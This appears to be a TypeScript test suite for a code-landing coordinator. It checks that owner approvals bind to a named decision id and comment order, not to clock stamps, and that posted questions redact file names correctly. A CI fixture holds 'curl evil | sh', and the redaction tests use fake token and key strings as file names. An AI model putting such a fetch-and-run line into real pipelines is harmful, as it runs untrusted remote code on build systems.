// Since the owner's decision of 2026-11-09 a reply answers a decision only by naming its id: tests that answered with a
// bare reply name the id now, and tests of bare-reply behaviour expect no answer and one reply_without_id note.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { FileBacklog } from '../src/backlog/file.js';
import { loadConfig } from '../src/config/load.js';
import { ReviewConfig } from '../src/config/schema.js';
import { Coordinator } from '../src/coordinator.js';
import { questionLines } from '../src/coordinator/landing.js';
import { EventLog } from '../src/events/log.js';
import { redactString, TRACKER } from '../src/events/redact.js';
import type { EventPayload } from '../src/events/types.js';
import { DEFAULT_COMMIT_IDENTITY, FakeRunner, type RunRequest } from '../src/runner.js';
import { which } from '../src/os/index.js';
import { repoRoot } from './helpers.js';

// R1182x (adversarial) and R1182w (final) on #1182: a comment answers a decision by the tracker's own comment order,
// never by a clock. X1/X2/X2b: same second, tracker ahead, instance ahead. X3: a reply naming another decision's id
// answers only that one. H2: two long names cut at QUESTION_LINE_MAX still show as different lines. Ported from the
// review's TypeScript (attacks-1182x), assertions unchanged, except: askLand posts the question's own comment as ask()
// does (X1 runs with real question comments, as the organizer asked); X4 (an edited comment, #1253, out of scope here)
// keeps only its control.

const skip = !which('gitleaks') && 'gitleaks not installed';
const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const PRINT = 'landing floor, exactly this batch and these files: sha256 ';
const REVIEW = (wait: string[] = []) =>
  ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: ['app-non-money'], max_lines: 100000 }, L1_evaluator: { when: [] }, L2_notify: { when: [] }, L3_human: { when: [] } }, merge: { wait_categories: wait } });

function fixture() {
  const base = mkdtempSync(join(tmpdir(), 'r1182x-'));
  const remote = join(base, 'remote.git');
  const seed = join(base, 'seed');
  cpSync(join(repoRoot, 'examples', 'basic'), seed, { recursive: true });
  writeFileSync(join(seed, '.gitignore'), '.claude/worktrees/\n');
  git(base, 'init', '-q', '--bare', '-b', 'main', remote);
  git(seed, 'init', '-q', '-b', 'main');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', 'add', '-A');
  git(seed, '-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  git(seed, 'remote', 'add', 'origin', remote);
  git(seed, 'push', '-q', 'origin', 'main');
  const repo = join(base, 'clone');
  git(base, 'clone', '-q', remote, repo);
  for (const [k, v] of [['user.email', 'coordinator@example.com'], ['user.name', 'coordinator'], ['commit.gpgsign', 'false'], ['core.precomposeunicode', 'false']]) git(repo, 'config', k!, v!);
  const cfg = loadConfig(repo);
  cfg.project.land_mode = 'direct';
  cfg.tests.runner.changed = 'node --test --test-reporter=spec';
  cfg.review = REVIEW();
  const slotsDir = join(base, 'slots');
  mkdirSync(slotsDir);
  writeFileSync(join(slotsDir, 'config.json'), JSON.stringify({ max_agents: 2 }));
  const stateDir = join(base, 'state');
  mkdirSync(stateDir, { recursive: true });
  return { base, remote, repo, cfg, backlog: new FileBacklog(join(base, 'backlog.json'), 'coordinator'), log: new EventLog(join(base, 'events.db')), slotsDir, stateDir };
}
type Fixture = ReturnType<typeof fixture>;
type Queued = EventPayload<'land.queued'>;
type Floor = { held: string[]; ask: unknown[]; seen: boolean; listed: string[]; print: string };
const ISSUE = 'Totals count non-positive quantities.\n\n```done_when\n- test: test/price.test.js\n```\n';
const runner = (extra: Record<string, string>) =>
  new FakeRunner((req: RunRequest) => {
    if (req.role === 'worker') {
      const p = join(req.cwd, 'src', 'price.js');
      writeFileSync(p, readFileSync(p, 'utf8').replace('sum + cents * qty', 'sum + (qty > 0 ? cents * qty : 0)'));
      for (const [f, body] of Object.entries(extra)) {
        mkdirSync(dirname(join(req.cwd, f)), { recursive: true });
        writeFileSync(join(req.cwd, f), body);
      }
      git(req.cwd, 'add', '-A');
      git(req.cwd, '-c', `user.email=${DEFAULT_COMMIT_IDENTITY.email}`, '-c', `user.name=${DEFAULT_COMMIT_IDENTITY.name}`, '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'fix');
      return { structured: { summary: 'fixed' } };
    }
    return { structured: { patch_correct: true, test_correct: true, confidence: 'high', advice: 'looks right', claims: [{ claim: 'read the diff in full', label: 'measured', basis: 'git diff' }], files_reviewed: ['src/price.js', ...Object.keys(extra)], design_change: false } };
  });
const coord = (f: Fixture, extra: Record<string, string> = {}, o: { autoMerge?: () => boolean } = {}) =>
  new Coordinator({ cfg: f.cfg, log: f.log, backlog: f.backlog, runner: runner(extra), repo: f.repo, instance: 'alice', stateDir: f.stateDir, slotsDir: f.slotsDir, maxAttempts: 1, machine: { load: () => 1, disk: () => ({ freePct: 80, totalGb: 500 }) }, ...(o.autoMerge ? { autoMerge: o.autoMerge } : {}) });
async function cycle(f: Fixture, extra: Record<string, string> = {}, o: { autoMerge?: () => boolean } = {}) {
  const c = coord(f, extra, o);
  await c.tick();
  await c.idle();
}
const landFloor = (f: Fixture, tip: string, head: string, applied: Queued[]) => (coord(f) as unknown as { landFloor(p: string, t: string, h: string, a: Queued[]): Floor }).landFloor(f.repo, tip, head, applied);
const onMain = (f: Fixture) => git(f.base, '--git-dir', f.remote, 'ls-tree', '-r', '--name-only', 'main').split('\n');
const asked = (f: Fixture) => f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).filter((q) => q.kind === 'land');

let n = 0;
function levelAndApprove(f: Fixture, o: { issue: number; head: string; level: 'L1' | 'L3'; reasons?: string[]; approved?: boolean }) {
  f.log.append('review.level_set', { issue: o.issue, head: o.head, level: o.level, reasons: o.reasons ?? [] }, 'coordinator');
  if (o.approved) {
    const id = `r${o.issue}-${n++}`;
    f.log.append('decision.asked', { id, kind: 'land', issue: o.issue, owner: 'example-owner', question: 'Approve?', options: ['approve', 'reject'], recommendation: 'reject', receipts: [] }, 'coordinator');
    f.log.append('decision.answered', { id, by: 'example-owner', answer: 'approve' }, 'example-owner', 'human');
  }
}
function event(f: Fixture, o: { issue: number; head: string; base: string; files: string[]; level: 'L1' | 'L3'; approved?: boolean }): Queued {
  f.log.append('change.proposed', { issue: o.issue, branch: `b${o.issue}`, base: o.base, head: o.head, files: o.files, lines: 1, patch_hash: 'x' }, 'coordinator');
  levelAndApprove(f, o);
  const q = { issue: o.issue, head: o.head, level: o.level } as Queued;
  f.log.append('land.queued', q, 'coordinator');
  return q;
}
/** What decisions.ts does on an approve to a landing question: the level (with the print) stays, the entry is queued at L3. */
const approveAtLanding = (f: Fixture, qs: Queued[], fl: Floor): Queued[] => {
  const reasons = [...fl.held.map((r) => `${r}: held`), ...fl.listed, `${PRINT}${fl.print}`];
  return qs.map((q) => {
    levelAndApprove(f, { issue: q.issue, head: q.head, level: 'L3', reasons, approved: true });
    const p = { issue: q.issue, head: q.head, level: 'L3' } as Queued;
    f.log.append('land.queued', p, 'coordinator');
    return p;
  });
};
const put = (r: string, p: string, body: string) => {
  mkdirSync(dirname(join(r, p)), { recursive: true });
  writeFileSync(join(r, p), body);
};
const commitIn = (r: string) => (m: string) => {
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '--allow-empty', '-m', m);
  return git(r, 'rev-parse', 'HEAD');
};
function withApproved(f: Fixture) {
  const r = f.repo;
  const tip = git(r, 'rev-parse', 'HEAD');
  const commit = commitIn(r);
  writeFileSync(join(r, 'src', 'ok.js'), 'export const ok = 1;\n');
  const a = commit('A');
  const qa = event(f, { issue: 1, head: a, base: tip, files: ['src/ok.js'], level: 'L3', approved: true });
  const output = (write: () => void, m = 'pre-land') => {
    git(r, 'checkout', '-q', '-f', a);
    write();
    return commit(m);
  };
  return { tip, qa, output };
}
const CI = 'test: { script: [echo ok] }\n';
/** The comment exactly as ask() (src/coordinator/base.ts at 03f28aa5) builds it (each receipt redacted on its own), then as every backlog posts it. */
const posted = (fl: Floor) => {
  const receipts = ['head 00000000', ...questionLines(fl.held.map((r) => `${r}: held`), fl.listed, 'review.level_set event 1'), `${PRINT}${fl.print}`];
  const body = `[wl] @example-owner decision needed: **Approve landing #1 (L3)?**\n\nOptions: approve / reject. Recommendation: **reject**.\n\n${receipts.map((r) => `- ${redactString(r, TRACKER)}`).join('\n')}\n\nReply \`/wl approve\` or \`/wl reject\` (owner or a writer), or run \`wl decide d-1 <option>\`.`;
  return redactString(body, TRACKER);
};
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const OPTS = ['approve', 'reject'];
const CMD = /^\/worklane\s+(\S+)/m;
type Answer = { by: string; answer: string; role: string } | null;
const commentAnswer = (f: Fixture, q: EventPayload<'decision.asked'>): Promise<Answer> =>
  (coord(f) as unknown as { commentAnswer(n: number, q: EventPayload<'decision.asked'>, w: Set<string>, c: RegExp): Promise<Answer> }).commentAnswer(1, q, new Set(f.cfg.project.owners.writers.map((w) => w.toLowerCase())), CMD);
const askLand = (f: Fixture, id: string) => {
  const q = { id, kind: 'land' as const, issue: 1, owner: 'example-owner', question: 'Approve landing #1 (L3)?', options: OPTS, recommendation: 'reject', receipts: [] };
  const e = f.log.append('decision.asked', q, 'coordinator');
  // As ask() posts it.
  f.backlog.humanComment(1, 'coordinator', `[worklane] @example-owner decision needed: **${q.question}**\n\nReply \`/worklane approve ${id}\` or \`/worklane reject ${id}\`, or run \`worklane decide ${id} <option>\`.`);
  return { q, ts: (f.log.read(0, ['decision.asked']).find((x) => (x.payload as { id: string }).id === id)!).ts, e };
};
const blobOnMain = (f: Fixture, p: string) => {
  try {
    return git(f.base, '--git-dir', f.remote, 'cat-file', '-p', `main:${p}`);
  } catch {
    return null;
  }
};

// ---- X1: a reply posted before the question, stamped in its second (or later), answers it only by a clock ----
// Changed from the review's X1 (which posted the reply after both questions and relied on its stamp alone): askLand now
// posts each question's comment, as ask() does, so "before question 2" is the tracker's order: question 1's comment,
// the reply, question 2's comment. The reply's stamp is chosen so the time rule of 03f28aa5 would count it for question 2.
async function x1(stamp: (d2ts: number) => number) {
  const f = fixture();
  f.backlog.open({ title: 't', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  const d1 = askLand(f, 'd-1-aaaaaa');
  await sleep(1100);
  // The reply to question 1 goes in now, before question 2; its stamp is set once question 2's time is known.
  f.backlog.humanComment(1, 'example-owner', '/worklane approve d-1-aaaaaa');
  const d2 = askLand(f, 'd-1-bbbbbb');
  const at = stamp(Date.parse(d2.ts));
  const p = join(f.base, 'backlog.json');
  const j = JSON.parse(readFileSync(p, 'utf8'));
  for (const i of j.issues) for (const c of i.comments ?? []) if (c.body === '/worklane approve d-1-aaaaaa') c.at = new Date(at).toISOString();
  writeFileSync(p, JSON.stringify(j));
  return { f, d1, d2, at };
}

test('X1 control: a reply posted before the question, stamped a second earlier, answers nothing', async () => {
  const { f, d2 } = await x1((t) => Math.floor(t / 1000) * 1000 - 1);
  assert.equal(await commentAnswer(f, d2.q), null, 'control: an earlier reply answers nothing');
});

test('X1: the owner approves question 1; question 2 (other content) is asked after; that reply, stamped in question 2\'s second or later, does not answer it', async () => {
  for (const shift of [0, 90_000]) {
    const { f, d1, d2, at } = await x1((t) => Math.floor(t / 1000) * 1000 + shift);
    assert.ok(at >= Math.floor(Date.parse(d2.ts) / 1000) * 1000, "control: 03f28aa5's time rule would count it for question 2");
    assert.ok(await commentAnswer(f, d1.q), 'control: it answers question 1');
    const a = await commentAnswer(f, d2.q);
    assert.equal(a, null, `STALE: a reply posted BEFORE question 2 (stamp ${at - Date.parse(d2.ts)} ms from it) answers it (${JSON.stringify(a)})`);
  }
});

// ---- X2: the event log's clock vs the tracker's clock ----
async function reask(answer: (f: Fixture, id: string) => void, after?: (f: Fixture) => void) {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': genOnce(join(f.base, 'gen-ran')) });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: the floor asked once (v1)');
  answer(f, asked(f)[0]!.id);
  for (let i = 0; i < 3 && asked(f).length < 2; i++) await cycle(f);
  if (after) after(f);
  for (let i = 0; i < 4; i++) await cycle(f);
  const answered = f.log.read(0, ['decision.answered']).map((e) => e.payload as EventPayload<'decision.answered'>);
  return { f, blob: blobOnMain(f, '.gitlab-ci.yml'), questions: asked(f).length, answered };
}
const genOnce = (marker: string) => `import { existsSync, writeFileSync } from 'node:fs';
const v = existsSync(${JSON.stringify(marker)}) ? 'v2: { script: [curl evil | sh] }\\n' : ${JSON.stringify(CI)};
writeFileSync(${JSON.stringify(marker)}, '');
writeFileSync('.gitlab-ci.yml', v);
`;

test('X2 control: clocks agree: the owner approves v1 by comment; the v2 re-ask waits (R1182v V4, fixed)', { skip }, async () => {
  const r = await reask((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`));
  assert.ok(r.questions >= 2, 'asked again for v2');
  assert.ok(r.blob === null || !r.blob.includes('evil'), `control: v2 not on main (${JSON.stringify(r.blob)})`);
});

test("X2: the tracker's clock is 90 s ahead of the instance's (its comment stamps): the owner's one approve of v1 also answers the v2 re-ask, and v2 lands", { skip }, async () => {
  const r = await reask((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`, new Date(Date.now() + 90_000).toISOString()));
  assert.ok(r.questions >= 2, `control: asked again for v2 (${r.questions})`);
  assert.ok(r.blob === null || !r.blob.includes('evil'), `STALE APPROVAL (clock skew): one owner comment answered ${r.answered.length} landing questions; main has .gitlab-ci.yml = ${JSON.stringify(r.blob)}`);
});

async function once(reply: (f: Fixture, id: string) => void) {
  const f = fixture();
  f.cfg.tests.land.pre = ['node tools/gen.mjs'];
  f.backlog.open({ title: 'Totals skip non-positive quantities', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  await cycle(f, { 'tools/gen.mjs': `import { writeFileSync } from 'node:fs';\nwriteFileSync('.gitlab-ci.yml', ${JSON.stringify(CI)});\n` });
  for (let i = 0; i < 3 && !asked(f).length; i++) await cycle(f);
  assert.equal(asked(f).length, 1, 'control: the floor asked');
  await sleep(50);
  reply(f, asked(f)[0]!.id);
  for (let i = 0; i < 3; i++) await cycle(f);
  return { f, blob: blobOnMain(f, '.gitlab-ci.yml'), questions: asked(f).length };
}

test("X2b control: the instance's clock is 90 s ahead of the tracker's; a reply naming the id answers, and it lands", { skip }, async () => {
  const r = await once((f, id) => f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`, new Date(Date.now() - 90_000).toISOString()));
  assert.ok(r.blob !== null, 'control: landed');
});

test("X2b: a bare `/worklane approve` (no id), whatever its stamp, answers nothing and says to name the id; the reply the question asks for (with the id) lands (X2b control)", { skip }, async () => {
  const r = await once((f) => f.backlog.humanComment(1, 'example-owner', '/worklane approve', new Date(Date.now() - 90_000).toISOString()));
  // Changed (the owner, 2026-11-09): the id is required, and the question says so.
  assert.equal(r.blob, null, 'a bare reply lands nothing');
  assert.ok(r.f.log.read(0, ['coordinator.error']).some((e) => (e.payload as { kind: string }).kind === 'reply_without_id'), 'and says why');
});

// ---- X3: a reply that names another decision's id answers this one ----
test('X3 (unit): question 1 and question 2 are both on the issue; the owner replies `/worklane approve <id of 1>`; it answers question 2', async () => {
  const f = fixture();
  f.backlog.open({ title: 't', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  const d1 = askLand(f, 'd-1-aaaaaa');
  const d2 = askLand(f, 'd-1-bbbbbb');
  await sleep(1100);
  f.backlog.humanComment(1, 'example-owner', '/worklane approve d-1-aaaaaa');
  assert.ok(await commentAnswer(f, d1.q), 'control: it answers question 1');
  const a = await commentAnswer(f, d2.q);
  assert.equal(a, null, `WRONG QUESTION: a reply naming d-1-aaaaaa answers d-1-bbbbbb (${JSON.stringify(a)})`);
});

test('X3 (end to end): v1 approved on the dashboard; the v2 re-ask is posted; the owner then confirms v1 in the thread (`/worklane approve <v1 id>`): v2 lands on it', { skip }, async () => {
  let v1 = '';
  const r = await reask(
    (f, id) => {
      v1 = id;
      f.log.append('decision.answered', { id, by: 'example-owner', answer: 'approve', role: 'owner' }, 'example-owner', 'human');
    },
    (f) => {
      assert.equal(asked(f).length, 2, 'control: the v2 re-ask is posted');
      f.backlog.humanComment(1, 'example-owner', `/worklane approve ${v1}`);
    },
  );
  assert.ok(r.blob === null || !r.blob.includes('evil'), `WRONG QUESTION: an approve naming the v1 question (${v1}) answered the v2 one; main has ${JSON.stringify(r.blob)}`);
});

test('X4 control: a writer\'s own `/worklane approve` never answers a landing question', { skip }, async () => {
  const r = await once((f) => {
    f.cfg.project.owners.writers.push('wendy-writer');
    f.backlog.humanComment(1, 'wendy-writer', '/worklane approve');
  });
  assert.equal(r.blob, null, 'control: not landed');
});
// X4 itself (a writer edits the owner's comment into an approval) is on main and tracked as #1253; out of scope here.

// ---- X5: who and where ----
test("X5 (held): a reply naming the id on another issue, and a non-writer's reply naming the id, answer nothing", { skip }, async () => {
  const r = await once((f, id) => {
    f.backlog.open({ title: 'other', body: 'x', author: 'example-owner', labels: [] });
    f.backlog.humanComment(2, 'example-owner', `/worklane approve ${id}`);
    f.backlog.humanComment(1, 'mallory', `/worklane approve ${id}`);
  });
  assert.equal(r.blob, null, 'not landed');
});

// ---- H: names in the question after per-line redaction ----
const NAMES = [
  'docs/a@example.io',
  'docs/b@example.io',
  '.circleci/x -----BEGIN PRIVATE KEY-----',
  '.circleci/y -----END PRIVATE KEY-----',
  '.circleci/ghp_abcdefghijklmnopqrstuvwxyzABCDEF0123',
  '.circleci/Bearer',
  '.circleci/basic',
  '.circleci/z```done_when',
  '.circleci/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig',
  '.circleci/a /Users/example/k.yml',
  '.circleci/<!-- c.yml',
  '.circleci/c.yml -->',
];
test('H1: every listed line reaches the posted comment exactly (per-line, then whole-body redaction)', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const h = output(() => NAMES.forEach((p) => put(f.repo, p, CI)));
  const fl = landFloor(f, tip, h, [qa]);
  assert.equal(fl.ask.length, 1, 'control: held');
  const body = posted(fl);
  const missing = fl.listed.filter((l) => !body.includes(l));
  assert.deepEqual(missing, [], `lines changed or missing in the comment:\n${body}`);
  const shown = new Set(fl.listed);
  assert.equal(shown.size, fl.listed.length, 'no two listed lines are the same text');
});
test('H2: two long redactable names (an email in a long directory) show as the same text once cut at QUESTION_LINE_MAX', () => {
  const f = fixture();
  const { tip, qa, output } = withApproved(f);
  const dir = `.circleci/${'d'.repeat(200)}/${'e'.repeat(200)}/a@example.io`;
  const names = [`${dir}/1.yml`, `${dir}/2.yml`];
  const h = output(() => names.forEach((p) => put(f.repo, p, CI)));
  const fl = landFloor(f, tip, h, [qa]);
  const q = questionLines(fl.held, fl.listed, 'review.level_set event 1').filter((l) => l.startsWith('judged at landing'));
  assert.equal(new Set(q).size, q.length, `two bound files show as the same line:\n${q.join('\n')}`);
});

test("X6 (not the review's): ask() tells the owner to reply with the question's id, and that exact reply answers it", async () => {
  const f = fixture();
  f.backlog.open({ title: 't', body: ISSUE, author: 'example-owner', labels: ['ready'] });
  const c = coord(f) as unknown as { ask(k: string, i: number, o: string, q: string, opts: string[], rec: string, detail: string[]): Promise<string> };
  const id = await c.ask('land', 1, 'example-owner', 'Land?', OPTS, 'reject', ['x']);
  const body = (await f.backlog.comments(1)).map((x) => x.body).find((b) => b.includes('decision needed'))!;
  assert.ok(body.includes(`\`/worklane approve ${id}\``) && body.includes(`\`/worklane reject ${id}\``), body);
  f.backlog.humanComment(1, 'example-owner', `/worklane approve ${id}`);
  const q = f.log.read(0, ['decision.asked']).map((e) => e.payload as EventPayload<'decision.asked'>).find((x) => x.id === id)!;
  assert.equal((await commentAnswer(f, q))?.answer, 'approve');
});
